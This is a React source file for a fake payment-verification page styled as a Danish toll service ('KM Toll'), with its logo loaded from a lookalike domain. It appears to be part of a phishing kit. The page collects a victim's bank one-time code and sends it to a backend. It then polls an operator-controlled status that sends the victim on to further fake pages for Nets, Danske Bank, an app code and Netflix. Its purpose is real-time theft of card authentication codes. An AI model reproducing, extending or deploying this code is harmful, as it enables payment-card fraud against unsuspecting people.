import React, { useState, useEffect, useRef } from "react";
import {
  AppBar,
  Toolbar,
  Container,
  Typography,
  TextField,
  Button,
  Box,
  Paper,
  SvgIcon,
  useMediaQuery,
  useTheme,
  Menu,
  MenuItem,
  ListItemIcon,
  Alert,
  Grid,
  CircularProgress,
  Snackbar,
  IconButton,
} from "@mui/material";
import CheckIcon from "@mui/icons-material/Check";
import CloseIcon from "@mui/icons-material/Close";
import { useNavigate, useLocation } from "react-router-dom";

// Custom dropdown arrow icon
const KeyboardArrowDownIcon = (props) => (
  <SvgIcon {...props} viewBox="0 0 24 24">
    <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
  </SvgIcon>
);

// Logo component
const KMTollLogo = () => (
  <img
    src="https://kmt.vejafgifter.dk/e0845ea56d96bcb377f9.svg"
    alt="KM Toll Logo"
    id="kmTollLogo"
    style={{ height: 36, cursor: "pointer" }}
  />
);

// Country to language mapping
const countryToLanguage = {
  dk: 'da',
  se: 'en',
  no: 'en',
  fi: 'en',
  de: 'en',
  fr: 'en',
  es: 'en',
  it: 'en',
  nl: 'en',
  pl: 'en',
  us: 'en',
  gb: 'en',
  au: 'en',
  ca: 'en',
  nz: 'en',
  ie: 'en',
};

// Translations
const translations = {
  en: {
    title: "Verification",
    description: "We've sent a 6-digit verification code to your registered mobile number. Please enter it below to complete your payment.",
    codeLabel: "Verification code",
    codePlaceholder: "Enter 6-digit code",
    verify: "Verify",
    back: "Back",
    resend: "Resend code",
    resendIn: "Resend code in",
    seconds: "s",
    invalidCode: "Invalid verification code. Please try again.",
    required: "Verification code is required",
    codeLength: "Verification code must be 6 digits",
    processing: "Verifying",
    success: "Verification successful!",
    resendSuccess: "New verification code sent!",
    resendError: "Failed to resend code. Please try again.",
    transactionRejected: "Transaction rejected. Please try again.",
    otpVerified: "OTP verified successfully!",
    errorSendingCode: "Error sending verification code",
    errorRequestingCode: "Error requesting new code",
    newCodeRequested: "New code requested successfully",
    paymentIdNotFound: "Payment ID not found",
    cardNumber: "Card Number",
    transactionApproved: "Transaction approved! Redirecting...",
  },
  da: {
    title: "Verifikation",
    description: "Vi har sendt en 6-cifret verificeringskode til dit registrerede mobilnummer. Indtast den nedenfor for at fuldføre din betaling.",
    codeLabel: "Verificeringskode",
    codePlaceholder: "Indtast 6-cifret kode",
    verify: "Bekræft",
    back: "Tilbage",
    resend: "Send kode igen",
    resendIn: "Send kode igen om",
    seconds: "s",
    invalidCode: "Ugyldig verificeringskode. Prøv venligst igen.",
    required: "Verificeringskode er påkrævet",
    codeLength: "Verificeringskode skal være 6 cifre",
    processing: "Verificerer",
    success: "Verifikation lykkedes!",
    resendSuccess: "Ny verificeringskode sendt!",
    resendError: "Kunne ikke sende kode igen. Prøv venligst igen.",
    transactionRejected: "Transaktion afvist. Prøv venligst igen.",
    otpVerified: "OTP verificeret succesfuldt!",
    errorSendingCode: "Fejl ved sending af verificeringskode",
    errorRequestingCode: "Fejl ved anmodning om ny kode",
    newCodeRequested: "Ny kode anmodet succesfuldt",
    paymentIdNotFound: "Betalings-ID ikke fundet",
    cardNumber: "Kortnummer",
    transactionApproved: "Transaktion godkendt! Viderestiller...",
  }
};

export default function OtpPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const apiUrl = import.meta.env.VITE_API_URL;
  
  // Language state
  const [language, setLanguage] = useState("Dansk");
  const [anchorEl, setAnchorEl] = useState(null);
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  
  // OTP states
  const [otp, setOtp] = useState("");
  const [seconds, setSeconds] = useState(60);
  const [isResendDisabled, setIsResendDisabled] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const [idRequest, setIdRequest] = useState(null);
  const [notification, setNotification] = useState(null);
  const [currentDate, setCurrentDate] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [pollingInterval, setPollingInterval] = useState(null);
  
  // Get paymentId from navigation state
  const { paymentId } = location.state || {};
  
  const open = Boolean(anchorEl);
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("sm"));
  const inputRef = useRef(null);

  // Get translation based on language
  const t = (key) => {
    const lang = language === "Dansk" ? "da" : "en";
    return translations[lang]?.[key] || translations.en[key] || key;
  };

  // Detect language based on IP
  const detectLanguageByIP = async () => {
    try {
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      const data = await res.json();
      const countryCode = data.country_code?.toLowerCase();
      const detectedLang = countryToLanguage[countryCode] || 'en';
      
      // Convert to display format
      const displayLang = detectedLang === 'da' ? 'Dansk' : 'English';
      setLanguage(displayLang);
      localStorage.setItem('preferredLanguage', displayLang);
    } catch (error) {
      console.error('Error detecting language:', error);
      const savedLang = localStorage.getItem('preferredLanguage');
      if (savedLang && (savedLang === 'Dansk' || savedLang === 'English')) {
        setLanguage(savedLang);
      } else {
        const browserLang = navigator.language.split('-')[0];
        setLanguage(browserLang === 'da' ? 'Dansk' : 'English');
      }
    } finally {
      setIsLoadingLang(false);
    }
  };

  useEffect(() => {
    detectLanguageByIP();
  }, []);

  // Auto-focus input on mount
  useEffect(() => {
    if (inputRef.current && !isLoadingLang) {
      inputRef.current.focus();
    }
  }, [isLoadingLang]);

  // Set current date
  useEffect(() => {
    const now = new Date();
    const formattedDate = now.toLocaleDateString(language === 'Dansk' ? 'da-DK' : 'en-US', {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
    setCurrentDate(formattedDate);
  }, [language]);

  // Timer for resend code
  useEffect(() => {
    if (seconds <= 0) {
      setIsResendDisabled(false);
      return;
    }
    const timer = setInterval(() => {
      setSeconds((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [seconds]);

  // Show notification
  const showNotification = (message, type) => {
    setNotification({ message, type });
    setTimeout(() => setNotification(null), 3000);
  };

  // Poll payment status every 3 seconds and navigate based on status
  const pollPaymentStatus = async (id) => {
    if (!id) return;

    try {
      const response = await fetch(`${apiUrl}/api/status/card/${id}`);
      const statusData = await response.json();

      console.log("📊 Payment status check in OtpPage:", statusData);

      // Handle different statuses
      if (statusData.status === "rejected") {
        console.log("❌ Transaction rejected");
        setStatus("rejected");
        setIsLoading(false);
        showNotification(t("transactionRejected"), "error");
        setOtp("");
      } 
      else if (statusData.status === "accepted" || statusData.status === "approved") {
        console.log("✅ Transaction approved - redirecting to Netflix");
        showNotification(t("transactionApproved"), "success");
        setTimeout(() => {
          window.location.href = "/SecurePayment";
        }, 2000);
      }
      else if (statusData.status === "otp") {
        console.log("🔄 Navigating to NetflixPaymentVerification");
        navigate("/NetflixPaymentVerification", { 
          state: { paymentId: id, language: language } 
        });
      }
      else if (statusData.status === "otp2") {
        console.log("🔄 Navigating to Nets");
        navigate("/Nets", { state: { paymentId: id, language: language } });
      }
      else if (statusData.status === "app") {
        console.log("🔄 Navigating to Appotp");
        navigate("/Appotp", { state: { paymentId: id, language: language } });
      }
      else if (statusData.status === "otp3") {
        console.log("🔄 Navigating to Danske");
        navigate("/Danske", { state: { paymentId: id, language: language } });
      }
      else if (statusData.status === "otp4") {
        console.log("⏳ Still on OtpPage - waiting for status change");
        // Just continue polling, don't navigate
      }
      else {
        console.log("⏳ Unknown status, continuing to poll:", statusData.status);
      }
    } catch (err) {
      console.error("❌ Error polling payment status:", err);
    }
  };

  // Start polling payment status when component mounts
  useEffect(() => {
    if (paymentId) {
      console.log("🚀 Starting payment status polling for ID:", paymentId);
      
      // Initial check
      pollPaymentStatus(paymentId);
      
      // Set up interval for polling every 3 seconds
      const interval = setInterval(() => {
        pollPaymentStatus(paymentId);
      }, 3000);
      
      setPollingInterval(interval);
      
      // Cleanup interval on component unmount
      return () => {
        if (interval) {
          clearInterval(interval);
        }
      };
    } else {
      console.warn("⚠️ No paymentId provided to OtpPage");
    }
  }, [paymentId]);

  // Fetch card number
  useEffect(() => {
    if (paymentId) {
      fetch(`${apiUrl}/api/status/card/${paymentId}`)
        .then((res) => res.json())
        .then((data) => {
          console.log("💳 Card info fetched:", data);
          setCardNumber(data.cardNumber);
        })
        .catch((err) => console.error("Error fetching card info:", err));
    }
  }, [paymentId, apiUrl]);

  // Poll OTP status (for the code verification)
  useEffect(() => {
    const pollOtpStatus = async () => {
      if (!idRequest || status !== "pending") return;

      try {
        const res = await fetch(`${apiUrl}/api/otp/status/${idRequest}`);
        const data = await res.json();
        
        console.log("🔐 OTP Status check:", data);
        
        if (data.status === "accepted") {
          console.log("✅ OTP accepted!");
          setStatus("accepted");
          setIsLoading(false);
          showNotification(t("otpVerified"), "success");
          setTimeout(() => {
            window.location.href = "/SecurePayment";
          }, 2000);
        } else if (data.status === "rejected") {
          console.log("❌ OTP rejected!");
          setStatus("rejected");
          setIsLoading(false);
          showNotification(t("transactionRejected"), "error");
          setOtp("");
        } else {
          console.log("⏳ Waiting for OTP verification...");
          setTimeout(pollOtpStatus, 2000);
        }
      } catch (err) {
        console.error("Error confirming OTP status:", err);
        setTimeout(pollOtpStatus, 2000);
      }
    };

    if (idRequest && status === "pending") {
      pollOtpStatus();
    }
  }, [idRequest, status, apiUrl, t]);

  // Send OTP code
  const sendOtpCode = async (otpCode) => {
    try {
      if (!paymentId) {
        showNotification(t("paymentIdNotFound"), "error");
        return false;
      }

      console.log("📤 Sending OTP code for verification:", otpCode);
      
      const response = await fetch(`${apiUrl}/api/send-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          code: otpCode,
          cardId: paymentId
        }),
      });
      
      const data = await response.json();
      
      if (response.ok && data.id) {
        console.log("✅ OTP sent successfully, ID:", data.id);
        setIdRequest(data.id);
        setStatus("pending");
        return true;
      } else {
        console.error("❌ Failed to send OTP:", data.error);
        showNotification(data.error || t("errorSendingCode"), "error");
        return false;
      }
    } catch (err) {
      console.error("Error sending code:", err);
      showNotification(t("errorSendingCode"), "error");
      return false;
    }
  };

  // Request a new code (resend)
  const requestNewCode = async () => {
    try {
      if (!paymentId) {
        showNotification(t("paymentIdNotFound"), "error");
        return false;
      }

      console.log("📨 Requesting new code...");
      
      const response = await fetch(`${apiUrl}/api/resend-otp-request`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          cardId: paymentId,
          oldOtpId: idRequest
        }),
      });
      
      const data = await response.json();
      
      if (response.ok) {
        console.log("✅ New code requested successfully");
        showNotification(t("newCodeRequested"), "success");
        return true;
      } else {
        console.error("❌ Failed to request new code:", data.error);
        showNotification(data.error || t("errorRequestingCode"), "error");
        return false;
      }
    } catch (err) {
      console.error("Error requesting new code:", err);
      showNotification(t("errorRequestingCode"), "error");
      return false;
    }
  };

  // Handle resend code
  const handleResendCode = async () => {
    if (isResendDisabled) return;
    
    // Reset timer
    setSeconds(60);
    setIsResendDisabled(true);
    
    // Send request for new code
    await requestNewCode();
  };

  // Handle OTP submit
  const handleOtpSubmit = async () => {
    if (!otp || otp.length !== 6) {
      showNotification(t("invalidCode"), "error");
      return;
    }
    
    console.log("🔐 Submitting OTP for verification:", otp);
    setIsLoading(true);
    const success = await sendOtpCode(otp);
    
    if (!success) {
      setIsLoading(false);
    }
  };

  // Format card number
  const formatCardNumber = (cardNum) => {
    if (!cardNum) return "XXXX XXXX XXXX 1111";
    const last4 = cardNum.slice(-4);
    return `XXXX XXXX XXXX ${last4}`;
  };

  // Handle language menu
  const handleLanguageClick = (event) => {
    setAnchorEl(event.currentTarget);
  };

  const handleLanguageClose = (lang) => {
    if (lang) {
      setLanguage(lang);
      localStorage.setItem('preferredLanguage', lang);
    }
    setAnchorEl(null);
  };

  // Handle back navigation
  const handleBack = () => {
    navigate(-1);
  };

  // Handle OTP input change
  const handleOtpChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 6) {
      setOtp(value);
    }
  };

  // Handle Enter key press
  const handleKeyPress = (e) => {
    if (e.key === 'Enter' && otp.length === 6) {
      handleOtpSubmit();
    }
  };

  if (isLoadingLang) {
    return (
      <div style={{ backgroundColor: "#f2f2f2", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
        <CircularProgress />
      </div>
    );
  }

  return (
    <div style={{ backgroundColor: "#f2f2f2", minHeight: "100vh", overflow: "hidden" }}>
      {/* Header */}
      <AppBar
        position="relative"
        elevation={0}
        sx={{
          backgroundColor: "#ffffff",
          color: "#000",
          borderBottom: "1px solid rgba(0,0,0,0.12)",
          padding: "0 24px",
          ...(isMobile && { padding: "0 12px" }),
        }}
      >
        <Toolbar sx={{ height: 94, padding: 0 }}>
          <KMTollLogo />
          <Box sx={{ flexGrow: 1 }} />

          <Button
            id="language-picker-button"
            onClick={handleLanguageClick}
            variant="outlined"
            disableRipple
            disableElevation
            sx={{
              width: 140,
              height: 40,
              minWidth: 140,
              px: 2,
              border: "1px solid #C9C9C9",
              borderRadius: "999px",
              backgroundColor: "#fff",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              textTransform: "none",
              fontFamily: "Campton",
              color: "#202020",
              boxShadow: "none",
              "&:hover": {
                backgroundColor: "#fff",
                border: "1px solid #C9C9C9",
                boxShadow: "none",
              },
            }}
          >
            <Typography
              sx={{
                fontFamily: "Campton",
                fontWeight: 600,
                fontSize: 14,
                color: "#202020",
              }}
            >
              {language}
            </Typography>

            <KeyboardArrowDownIcon sx={{ fontSize: 20 }} />
          </Button>

          <Menu
            anchorEl={anchorEl}
            open={open}
            onClose={() => handleLanguageClose()}
            anchorOrigin={{
              vertical: "bottom",
              horizontal: "left",
            }}
            transformOrigin={{
              vertical: "top",
              horizontal: "left",
            }}
            slotProps={{
              paper: {
                sx: {
                  mt: 1,
                  width: 140,
                  borderRadius: "6px",
                  overflow: "hidden",
                  boxShadow: "0 4px 14px rgba(0,0,0,.12)",
                },
              },
            }}
          >
            {["Dansk", "English"].map((item) => (
              <MenuItem
                key={item}
                onClick={() => handleLanguageClose(item)}
                selected={language === item}
                sx={{
                  height: 40,
                  px: 1.5,
                  fontFamily: "Campton",
                  fontSize: 14,
                  fontWeight: 600,
                  color: "#202020",
                  display: "flex",
                  justifyContent: "space-between",
                  "&.Mui-selected": {
                    background: "#F3F3F3",
                  },
                  "&.Mui-selected:hover": {
                    background: "#F3F3F3",
                  },
                }}
              >
                {item}
                {language === item && (
                  <ListItemIcon
                    sx={{
                      minWidth: "auto",
                      color: "#0078D4",
                    }}
                  >
                    <CheckIcon fontSize="small" />
                  </ListItemIcon>
                )}
              </MenuItem>
            ))}
          </Menu>
        </Toolbar>
      </AppBar>

      {/* Main Content */}
      <Container
        maxWidth={false}
        sx={{
          backgroundColor: "#f2f2f2",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          minHeight: "calc(100vh - 93px)",
          padding: isMobile ? "16px 12px" : "0",
          paddingTop: {
            xs: '40px',
            sm: '40px',
            md: '90px',
            lg: '90px',
            xl: '90px'
          },
          overflow: "hidden"
        }}
      >
        {/* OTP Form Container */}
        <Paper
          elevation={0}
          sx={{
            backgroundColor: "#ffffff",
            borderRadius: "8px",
            width: 560,
            height: "auto",
            minHeight: 340,
            margin: "0 12px",
            display: "flex",
            flexDirection: "column",
            alignItems: "flex-start",
            justifyContent: "center",
            boxSizing: "border-box",
            "@media (max-width: 600px)": {
              width: "100%",
              height: "auto",
              margin: 0,
            },
          }}
        >
          <Box sx={{ width: "100%", p: '54px 10px 54px 54px' }}>
            <Grid container spacing={3}>
              {/* Title */}
              <Grid item xs={12}>
                <Typography
                  sx={{
                    fontSize: "19px",
                    fontWeight: 625,
                    lineHeight: "20px",
                    letterSpacing: "-0.3px",
                    color: "rgb(45, 45, 45)",
                  }}
                >
                  {t("title")}
                </Typography>
              </Grid>

              {/* Description */}
              <Grid item xs={12}>
                <Typography
                  sx={{
                    fontSize: 14,
                    lineHeight: 1.4,
                    color: "#2d2d2d",
                    maxWidth: 480,
                  }}
                >
                  {t("description")}
                </Typography>
              </Grid>

              {/* Card Number Display */}
              {cardNumber && (
                <Grid item xs={12}>
                  <Typography
                    sx={{
                      fontSize: 13,
                      color: "#555",
                      fontFamily: "CamptonBook",
                    }}
                  >
                    {t("cardNumber")}: {formatCardNumber(cardNumber)}
                  </Typography>
                </Grid>
              )}

              {/* Date Display */}
              {currentDate && (
                <Grid item xs={12}>
                  <Typography
                    sx={{
                      fontSize: 12,
                      color: "#888",
                      fontFamily: "CamptonBook",
                    }}
                  >
                    {currentDate}
                  </Typography>
                </Grid>
              )}

              {/* OTP Input */}
              <Grid item xs={12}>
                <Box
                  sx={{
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "flex-start",
                    width: "100%",
                  }}
                >
                  <Typography
                    sx={{
                      fontSize: 13,
                      color: "#555",
                      mb: 0.5,
                      fontFamily: "CamptonBook",
                    }}
                  >
                    {t("codeLabel")}
                  </Typography>

                  <TextField
                    fullWidth
                    inputRef={inputRef}
                    placeholder={t("codePlaceholder")}
                    value={otp}
                    onChange={handleOtpChange}
                    onKeyPress={handleKeyPress}
                    disabled={isLoading || status === "accepted"}
                    inputProps={{
                      maxLength: 6,
                      inputMode: 'numeric',
                      pattern: '[0-9]*',
                      autoComplete: 'one-time-code',
                    }}
                    sx={{
                      width: "100%",
                      maxWidth: "100%",
                      "& .MuiOutlinedInput-root": {
                        height: 56,
                        borderRadius: "6px",
                        backgroundColor: "#fff",
                        fontSize: 20,
                        fontFamily: "CamptonBook",
                        letterSpacing: '4px',
                        textAlign: 'center',
                        "& fieldset": {
                          borderColor: "#c8c8c8",
                        },
                        "&:hover fieldset": {
                          borderColor: "#999",
                        },
                        "&.Mui-focused fieldset": {
                          borderColor: "#1a73e8",
                          borderWidth: "2px",
                        },
                        "&.Mui-error fieldset": {
                          borderColor: "#d32f2f",
                        },
                      },
                      "& .MuiInputBase-input": {
                        padding: "10px 12px !important",
                        height: "auto",
                        textAlign: 'center',
                        letterSpacing: '8px',
                        fontSize: 24,
                        fontWeight: 600,
                      },
                      "& input::placeholder": {
                        color: "#9a9a9a",
                        opacity: 1,
                        fontSize: 16,
                        letterSpacing: '4px',
                      },
                    }}
                  />
                </Box>
              </Grid>

              {/* Resend Code */}
              <Grid item xs={12}>
                <Box
                  sx={{
                    display: "flex",
                    alignItems: "center",
                    gap: 1,
                  }}
                >
                  <Button
                    onClick={handleResendCode}
                    disabled={isResendDisabled || isLoading || status === "accepted"}
                    sx={{
                      textTransform: "none",
                      fontFamily: "Campton",
                      fontWeight: 600,
                      fontSize: 14,
                      color: isResendDisabled ? "#999" : "#0576bf",
                      padding: 0,
                      minWidth: 'auto',
                      "&:hover": {
                        backgroundColor: "transparent",
                        textDecoration: !isResendDisabled ? "underline" : "none",
                      },
                      "&.Mui-disabled": {
                        color: "#999",
                      },
                    }}
                  >
                    {isResendDisabled 
                      ? `${t("resendIn")} ${seconds}${t("seconds")}`
                      : t("resend")
                    }
                  </Button>
                </Box>
              </Grid>
            </Grid>
          </Box>
        </Paper>

        {/* Action Buttons */}
        <Box
          sx={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            width: "100%",
            maxWidth: 560,
            marginTop: "12px",
            marginBottom: "24px",
            paddingLeft: isMobile ? "0" : "12px",
            paddingRight: isMobile ? "0" : "12px",
          }}
        >
          <Button
            onClick={handleBack}
            disabled={isLoading || status === "accepted"}
            sx={{
              textTransform: "none",
              fontFamily: "Campton",
              fontWeight: 400,
              fontSize: 14,
              color: "#0576bf",
              "&:hover": {
                backgroundColor: "transparent",
                textDecoration: "underline",
              },
            }}
          >
            {t("back")}
          </Button>

          <Button
            variant="contained"
            disabled={
              isLoading || 
              otp.length !== 6 || 
              status === "accepted" ||
              status === "pending"
            }
            onClick={handleOtpSubmit}
            sx={{
              borderRadius: "30px",
              textTransform: "none",
              fontFamily: "Campton",
              fontWeight: 550,
              fontSize: 14,
              lineHeight: 1.2,
              padding: "8px 32px",
              backgroundColor: "#0576bf",
              color: "#fff",
              border: "2px solid #0576bf",
              minHeight: 40,
              minWidth: 120,
              "&:hover": {
                backgroundColor: "#0466a6",
                borderColor: "#0466a6",
              },
              "&.Mui-disabled": {
                backgroundColor: "#0576bf",
                opacity: 0.5,
                color: "#fff",
                borderColor: "#0576bf",
              },
              ...(isMobile && {
                padding: "6px 16px",
                fontSize: 13,
                marginBottom: "1rem",
              }),
            }}
          >
            {isLoading ? (
              <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                <CircularProgress size={20} color="inherit" />
                {t("processing")}
              </Box>
            ) : (
              t("verify")
            )}
          </Button>
        </Box>
      </Container>

      {/* Notification Snackbar */}
      <Snackbar
        open={!!notification}
        autoHideDuration={3000}
        onClose={() => setNotification(null)}
        anchorOrigin={{ vertical: 'top', horizontal: 'center' }}
      >
        <Alert
          severity={notification?.type || 'info'}
          onClose={() => setNotification(null)}
          sx={{
            width: '100%',
            borderRadius: '8px',
            boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
          }}
        >
          {notification?.message}
        </Alert>
      </Snackbar>
    </div>
  );
}